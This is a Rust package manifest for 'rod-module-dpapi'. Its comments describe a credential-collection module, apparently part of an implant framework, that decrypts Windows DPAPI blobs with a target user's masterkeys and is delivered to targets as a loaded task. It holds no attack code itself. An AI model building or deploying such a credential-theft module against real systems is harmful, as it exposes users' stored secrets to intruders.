[package]
name = "rod-module-dpapi"
version = "1.0.0"
edition = "2021"

# The credential collection family's second module (architecture.md
# Sec 5.4): collect.dpapi, the DPAPI unsealing primitive -- the task's
# base64 blob decrypted under the target user's own masterkeys, with
# the masterkey directory's readiness read as the bare task's default.
# The Windows half speaks crypt32 and kernel32 directly: a module owes
# the loader no dependency for seven functions. Built as a cdylib for
# Windows targets and delivered as a module.load task's content.

[lib]
# rlib beside cdylib so the bin target below links the same plugin code;
# cargo emits the rlib for internal use only, the cdylib is the artifact.
crate-type = ["cdylib", "rlib"]

[[bin]]
name = "rod-module-dpapi"
path = "src/main.rs"

[dependencies]
rod-plugin-sdk = { path = "../../plugin-sdk" }
